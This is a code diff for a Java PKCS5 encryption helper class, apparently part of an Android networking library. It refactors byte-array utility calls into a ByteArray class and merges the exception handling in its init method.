@@ -19,6 +19,7 @@ import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 
 import com.android.networking.auto.Cfg;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 
@@ -38,7 +39,7 @@ public class EncryptionPKCS5 {
 
 		try {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (EncryptionPKCS5): " + Utils.byteArrayToHex(key));
+				Check.log(TAG + " (EncryptionPKCS5): " + ByteArray.byteArrayToHex(key));
 			}
 			init(key);
 		} catch (CryptoException e) {
@@ -62,12 +63,7 @@ public class EncryptionPKCS5 {
 	public void init(final byte[] key) throws CryptoException {
 		try {
 			crypto = new CryptoCBC(key);
-		} catch (NoSuchAlgorithmException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (init) Error: " + e);
-			}
-			throw new CryptoException();
-		} catch (NoSuchPaddingException e) {
+		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (init) Error: " + e);
 			}
@@ -159,8 +155,8 @@ public class EncryptionPKCS5 {
 			}
 			return null;
 		}
-		final byte[] plain = Utils.copy(plainSha, 0, plainSha.length - DIGEST_LENGTH);
-		final byte[] sha = Utils.copy(plainSha, plainSha.length - DIGEST_LENGTH, DIGEST_LENGTH);
+		final byte[] plain = ByteArray.copy(plainSha, 0, plainSha.length - DIGEST_LENGTH);
+		final byte[] sha = ByteArray.copy(plainSha, plainSha.length - DIGEST_LENGTH, DIGEST_LENGTH);
 		final byte[] calculatedSha = Digest.SHA1(plainSha, 0, plainSha.length - DIGEST_LENGTH);
 		// if(Cfg.DEBUG) Check.asserts(SHA1Digest.DIGEST_LENGTH == 20, //$NON-NLS-1$
 		// "DIGEST_LENGTH");
